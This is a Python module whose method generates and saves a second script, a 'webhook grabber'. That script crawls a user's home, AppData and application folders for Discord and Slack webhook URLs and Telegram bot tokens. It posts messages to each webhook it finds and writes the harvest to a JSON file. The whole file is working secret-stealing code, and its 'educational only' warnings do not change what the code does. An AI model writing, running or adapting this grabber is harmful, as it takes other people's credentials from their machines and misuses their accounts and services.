"""
Webhook Grabber - Extract and Test Webhooks
WARNING: For authorized testing and educational purposes only.
"""
import os
import tempfile
import json
import re
from typing import Dict, List, Optional
from datetime import datetime


class WebhookGrabber:
    """Webhook extraction and testing tool"""
    
    def create_webhook_grabber(self, target_types: List[str] = None,
                               test_webhook: bool = True) -> Dict:
        """Create webhook grabber"""
        target_types = target_types or ['discord', 'slack', 'telegram', 'generic']
        
        code = f'''"""
Educational Webhook Grabber - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import re
import json
import requests
from datetime import datetime

def find_discord_webhooks():
    """Find Discord webhook URLs"""
    webhooks = []
    
    # Common locations to search
    search_paths = [
        os.path.join(os.getenv('APPDATA'), 'Discord'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
        os.path.expanduser('~/.config/discord'),
        os.path.expanduser('~/Library/Application Support/discord')
    ]
    
    webhook_pattern = re.compile(r'https://discord\.com/api/webhooks/\\d+/[a-zA-Z0-9_-]+')
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if file.endswith(('.json', '.log', '.txt', '.db', '.sqlite')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = webhook_pattern.findall(content)
                                webhooks.extend(matches)
                        except:
                            pass
    
    return list(set(webhooks))  # Remove duplicates

def find_slack_webhooks():
    """Find Slack webhook URLs"""
    webhooks = []
    
    search_paths = [
        os.path.join(os.getenv('APPDATA'), 'Slack'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Slack'),
        os.path.expanduser('~/.config/slack'),
        os.path.expanduser('~/Library/Application Support/Slack')
    ]
    
    webhook_pattern = re.compile(r'https://hooks\.slack\.com/services/[a-zA-Z0-9/_-]+')
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if file.endswith(('.json', '.log', '.txt', '.db', '.sqlite')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = webhook_pattern.findall(content)
                                webhooks.extend(matches)
                        except:
                            pass
    
    return list(set(webhooks))

def find_telegram_bots():
    """Find Telegram bot tokens"""
    tokens = []
    
    search_paths = [
        os.path.expanduser('~'),
        os.path.join(os.getenv('APPDATA'), 'Telegram'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram')
    ]
    
    token_pattern = re.compile(r'\\d{{8,10}}:[a-zA-Z0-9_-]{{35}}')
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if file.endswith(('.json', '.log', '.txt', '.py', '.js', '.env')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                tokens.extend(matches)
                        except:
                            pass
    
    return list(set(tokens))

def find_generic_webhooks():
    """Find generic webhook URLs"""
    webhooks = []
    
    webhook_patterns = [
        re.compile(r'https://[^\\s]+webhook[^\\s]+', re.IGNORECASE),
        re.compile(r'https://[^\\s]+api[^\\s]+webhook[^\\s]+', re.IGNORECASE),
        re.compile(r'https://[^\\s]+hook[^\\s]+', re.IGNORECASE)
    ]
    
    search_paths = [
        os.path.expanduser('~'),
        os.path.join(os.getenv('APPDATA'), 'Code'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Code')
    ]
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if file.endswith(('.json', '.log', '.txt', '.py', '.js', '.env', '.config')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for pattern in webhook_patterns:
                                    matches = pattern.findall(content)
                                    webhooks.extend(matches)
                        except:
                            pass
    
    return list(set(webhooks))

def test_webhook(webhook_url, test_message="Webhook test from JARVIS"):
    """Test if webhook is valid"""
    try:
        response = requests.post(webhook_url, json={{"content": test_message}}, timeout=5)
        return {{
            'valid': response.status_code in [200, 204],
            'status_code': response.status_code,
            'response': response.text[:200] if response.text else None
        }}
    except Exception as e:
        return {{
            'valid': False,
            'error': str(e)
        }}

# Main execution
target_types = {target_types}
collected_webhooks = {{
    'timestamp': datetime.now().isoformat(),
    'discord': [],
    'slack': [],
    'telegram': [],
    'generic': []
}}

if 'discord' in target_types:
    print("Searching for Discord webhooks...")
    collected_webhooks['discord'] = find_discord_webhooks()
    print(f"Found {{len(collected_webhooks['discord'])}} Discord webhooks")

if 'slack' in target_types:
    print("Searching for Slack webhooks...")
    collected_webhooks['slack'] = find_slack_webhooks()
    print(f"Found {{len(collected_webhooks['slack'])}} Slack webhooks")

if 'telegram' in target_types:
    print("Searching for Telegram bot tokens...")
    collected_webhooks['telegram'] = find_telegram_bots()
    print(f"Found {{len(collected_webhooks['telegram'])}} Telegram tokens")

if 'generic' in target_types:
    print("Searching for generic webhooks...")
    collected_webhooks['generic'] = find_generic_webhooks()
    print(f"Found {{len(collected_webhooks['generic'])}} generic webhooks")

# Test webhooks if requested
if {test_webhook}:
    print("\\nTesting webhooks...")
    for webhook_type, webhooks in collected_webhooks.items():
        if webhook_type != 'timestamp' and webhooks:
            for webhook in webhooks:
                if webhook.startswith('http'):
                    test_result = test_webhook(webhook)
                    print(f"{{webhook_type}} webhook: {{'Valid' if test_result.get('valid') else 'Invalid'}}")

# Save results
with open('webhooks.json', 'w') as f:
    json.dump(collected_webhooks, f, indent=2)

print("\\nWebhook data saved to webhooks.json")
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"webhook_grabber_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'webhook_grabber',
            'file': filepath,
            'target_types': target_types,
            'test_webhook': test_webhook,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
